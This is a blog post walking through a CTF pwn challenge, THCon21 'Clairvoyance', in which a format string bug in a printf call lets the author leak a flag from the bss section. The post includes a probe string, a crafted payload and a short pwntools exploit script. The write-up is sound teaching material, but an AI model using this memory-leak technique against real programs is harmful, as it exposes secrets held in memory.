<!doctype html><html lang=en-us>
<head><title>
THCon21 - Clairvoyance |
Cyxo's Tech Blog</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name=description content="A format string pwn challenge from THCon21
    ">
<meta property="og:title" content="THCon21 - Clairvoyance">
<meta property="og:description" content="A format string pwn challenge from THCon21">
<meta property="og:type" content="article">
<meta property="og:url" content="https://blog.cyxo.cf/thcon-2021-ctf-write-ups/clairvoyance/"><meta property="article:section" content="THCon-2021-CTF-Write-Ups">
<meta property="article:published_time" content="2021-06-15T16:29:06+02:00">
<meta property="article:modified_time" content="2021-06-15T16:29:06+02:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="THCon21 - Clairvoyance">
<meta name=twitter:description content="A format string pwn challenge from THCon21">
<meta itemprop=name content="THCon21 - Clairvoyance">
<meta itemprop=description content="A format string pwn challenge from THCon21"><meta itemprop=datePublished content="2021-06-15T16:29:06+02:00">
<meta itemprop=dateModified content="2021-06-15T16:29:06+02:00">
<meta itemprop=wordCount content="495">
<meta itemprop=keywords content="pwn,">
<link rel=canonical href=https://blog.cyxo.cf/thcon-2021-ctf-write-ups/clairvoyance/>
<link rel=icon type=image/png href=https://blog.cyxo.cf/image/favicon.ico>
<link rel=stylesheet href=/css/font-awesome.min.css>
<link rel=stylesheet href=/css/bulma.min.css>
<script src=/js/ramium.js></script>
<link rel=stylesheet href=/css/ramium.css>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
</head>
<body><nav class="navbar is-dark" role=navigation aria-label="main navigation">
<div class=navbar-brand>
<a class=navbar-item href=/>
<strong>Cyxo's Tech Blog </strong>
</a>
<a role=button class="navbar-burger burger" aria-label=menu aria-expanded=false data-target=navbarBasicExample>
<span aria-hidden=true></span>
<span aria-hidden=true></span>
<span aria-hidden=true></span>
</a>
</div>
<div id=navbarBasicExample class=navbar-menu>
<div class=navbar-start>
<a class=navbar-item href=/>Home</a>
<div class="navbar-item has-dropdown is-hoverable">
<a class=navbar-link>This Blog</a>
<div class=navbar-dropdown>
<a class=navbar-item href=/tags/>All Tags</a>
<a class=navbar-item href=/sections/>All Sections</a>
<a class=navbar-item href=/posts/>All Posts</a>
</div>
</div>
<a class=navbar-item href=/author/>Author</a>
</div>
<div class=navbar-end>
<a class="navbar-item navgithub" href=https://github.com/Cyxo/ target=_blank>
<i class="fa fa-github fa-2x"></i>
</a>
</div>
</div>
</nav><div class="columns is-centered">
<div id=page-body class="column is-7">
<div class="content blog">
<h1>THCon21 - Clairvoyance</h1>
<div id=infobar class="level is-mobile">
<div class=level-left>
<div class=level-item>
<p class="subtitle info date">Jun 15, 2021
</p>
</div>
<div class=level-item>
<p class="subtitle info">
3 mins read
</p>
</div>
</div>
<div class="level-right is-hidden-touch">
<div class=tags>
<a class="tag is-dark is-rounded" href=/tags/pwn>Pwn</a>
</div>
</div>
</div>
<div class="tags is-hidden-desktop">
<a class="tag is-dark is-rounded" href=/tags/pwn>Pwn</a>
</div>
<div class=blog-text>
<p><a href=../>Go back to write-ups list</a></p>
<blockquote>
<p><strong>Category:</strong> Intro</p>
<p><strong>Creator:</strong> Voydstack</p>
<p><strong>Description:</strong></p>
<p>Do you have enough clairvoyance to read the flag inside my mind ?</p>
<p><strong>Attachments:</strong></p>
<ul>
<li><a href=/files/thcon21/clairvoyance>clairvoyance</a></li>
</ul>
</blockquote>
<h2 id=analysing-the-binary>Analysing the binary</h2>
<p>The attachment is an ELF x64 binary. Again, I opened it in IDA and went to the <code>main</code> function.</p>
<p><img src=/image/thcon21/clairvoyance.png alt="Clairvoyance main" title="Clairvoyance main"></p>
<p>To put it simply, the program asks you for your name and whether you want to read the flag. If you say &ldquo;yes&rdquo; to the latter, it will blow you off (and if you say something else, it&rsquo;ll just say bye as well).</p>
<p>The weakness here is that the program uses <code>printf(name)</code> after saying &ldquo;nice try&rdquo;, which makes it vulnerable to a format string bug in the name you enter.</p>
<p>Now let&rsquo;s look at the read_flag function, since the flag is not used anywhere in <code>main</code> but is probably loaded in memory.</p>
<p><img src=/image/thcon21/read_flag.png alt="Clairvoyance main"></p>
<p>Bingo! The content of the file <code>flag.txt</code> is read into the <code>flag</code> variable. However, <code>flag</code> is located in the bss section, not on the stack, when printf will read its arguments on the stack.</p>
<p><img src=/image/thcon21/bss.png alt="flag on bss"></p>
<p>But that&rsquo;s not really an issue.</p>
<h2 id=exploiting-the-format-string-bug>Exploiting the format string bug</h2>
<p><img src=/image/thcon21/funm.png alt="Awesome meme you are missing ðŸ˜¢" title=r/AAAAAAAAAAAAAAAAA></p>
<p>The address of the flag isn&rsquo;t on the stack, but our user input is. For example, here is what I get when I input <code>AAAAAAAA%p%p%p%p%p%p%p%p%p%p</code>:</p>
<pre tabindex=0><code>Nice try, but no flag for you, AAAAAAAA0x7ffeb09c38c0(nil)(nil)0x50x1f0x7ffeb09c60780x100401365(nil)0xa7365790x4141414141414141
</code></pre><p>(I&rsquo;d gladly put spaces between the <code>%p</code> but we&rsquo;re limited to 31 characters in total&mldr;)</p>
<p>Here, you can see that the beginning of our user input <code>AAAAAAAA</code> (or <code>0x4141414141414141</code>) shows up at the end, so at the 10th <code>%p</code>, which means that if we send <code>AAAAAAAA%10$s</code>, printf will try to display the string at the address <code>0x4141414141414141</code>.</p>
<p>Now if we replace <code>AAAAAAAA</code> by the address of <code>flag</code>, it should print the flag, right? Well, almost.</p>
<p>As you can see in the bss screenshot, the address of the flag is <code>0x0000000000404080</code>, which means that you&rsquo;ll have to throw in a bunch of null bytes, and fgets will stop reading your input once it sees a null byte.</p>
<p>So the little trick we&rsquo;re going to make is:</p>
<ul>
<li>Send <code>%11$s</code></li>
<li>Send 3 <code>A</code> for padding (making the length = 8), so that our address is fully on the 11th slot</li>
<li>Send our address</li>
</ul>
<p><em>Note: the actual address starts with null bytes as you can see on the screenshot. Fortunately, we have to send it backwards to the program (because of a different endianness), so the non-null bytes go first!</em></p>
<p>Now here is a little python script using pwntools that does exactly what we want:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>

elf <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;clairvoyance&#34;</span>)
bss <span style=color:#f92672>=</span> elf<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#34;flag&#34;</span>]        <span style=color:#75715e># Loads the address of the flag</span>
payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%11$sAAA&#39;</span> <span style=color:#f92672>+</span> p64(bss) <span style=color:#75715e># p64 converts it to 8 bytes with the right endian</span>
print(payload)

p <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#34;./clairvoyance&#34;</span>)
p<span style=color:#f92672>.</span>recv()
p<span style=color:#f92672>.</span>sendline(payload)
p<span style=color:#f92672>.</span>recv()
p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;yes&#34;</span>)
print(p<span style=color:#f92672>.</span>recv())
</code></pre></div><p><img src=/image/thcon21/clairvoyance_solved.png alt="Clairvoyance solved"></p>
<p><em>Note: as you can see on the screenshot, the binary has No PIE, so the address of <code>flag</code> in the bss doesn&rsquo;t change. Otherwise, the challenge would&rsquo;ve been more complicated.</em></p>
<p><a href=../>Go back to write-ups list</a></p>
</div>
</div><div id=social-media-share class=has-text-centered>
<p><i>Sharing is caring!</i></p>
<br>
<div class=share-buttons>
<a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fclairvoyance%2f" onclick="return socialMediaPopUp(this.href,'',500,500),!1" title="Share on Facebook. Opens in a new window.">
<img src=/img/icons/45px/facebook.png>
</a>
<a href="https://twitter.com/intent/tweet?text=THCon21%20-%20Clairvoyance&url=https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fclairvoyance%2f" onclick="return socialMediaPopUp(this.href,'',500,500),!1" title="Share on Twitter. Opens in a new window.">
<img src=/img/icons/45px/twitter.png>
</a>
<a href="http://www.reddit.com/submit?url=https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fclairvoyance%2f" onclick="return socialMediaPopUp(this.href,'',900,500),!1" title="Share on Reddit. Opens in a new window.">
<img src=/img/icons/45px/reddit.png>
</a>
<a href="http://pinterest.com/pin/create/button/?url=https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fclairvoyance%2f" onclick="return socialMediaPopUp(this.href,'',900,500),!1" title="Share on Pinterest. Opens in a new window.">
<img src=/img/icons/45px/pinterest.png>
</a>
<a href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fclairvoyance%2f" onclick="return socialMediaPopUp(this.href,'',900,500),!1" title="Share on Tumblr. Opens in a new window.">
<img src=/img/icons/45px/tumblr.png>
</a>
<a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fclairvoyance%2f
			&title=THCon21%20-%20Clairvoyance&summary=Go%20back%20to%20write-ups%20list%0a%20Category%3a%20Intro%0aCreator%3a%20Voydstack%0aDescription%3a%0aDo%20you%20have%20enough%20clairvoyance%20to%20read%20the%20flag%20inside%20my%20mind%20%3f%0aAttachments%3a%0a%20clairvoyance%20%20%20Analysing%20the%20binary%20The%20attachment%20is%20an%20ELF%20x64%20binary.%20Again%2c%20I%20opened%20it%20in%20IDA%20and%20went%20to%20the%20main%20function.&source=rafed123.github.io" onclick="return socialMediaPopUp(this.href,'',900,500),!1" title="Share on LinkedIn. Opens in a new window.">
<img src=/img/icons/45px/linkedin.png>
</a>
<a href="mailto:?subject=THCon21%20-%20Clairvoyance&body=Check out this site https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fclairvoyance%2f" title="Share via Email. Opens in a new window.">
<img src=/img/icons/45px/mail.png>
</a>
</div>
</div>
<br>
<div id=disqus_thread></div>
<script type=text/javascript>(function(){var a,b;if(window.location.hostname=="localhost")return;a=document.createElement('script'),a.type='text/javascript',a.async=!0,b='',a.src='//'+b+'.disqus.com/embed.js',(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
</div>
</div>
<footer class="footer has-background-dark">
<div class="content has-text-centered has-text-white">
<p>
Â© 2020 Ramium. Powered by
<a class=has-text-light href=https://github.com/gohugoio/hugo target=_blank>
Hugo</a>. Theme
<a class=has-text-light href=https://github.com/rafed123/ramium/ target=_blank>
Ramium.
</a>
</p>
</div>
</footer>
</body>
</html>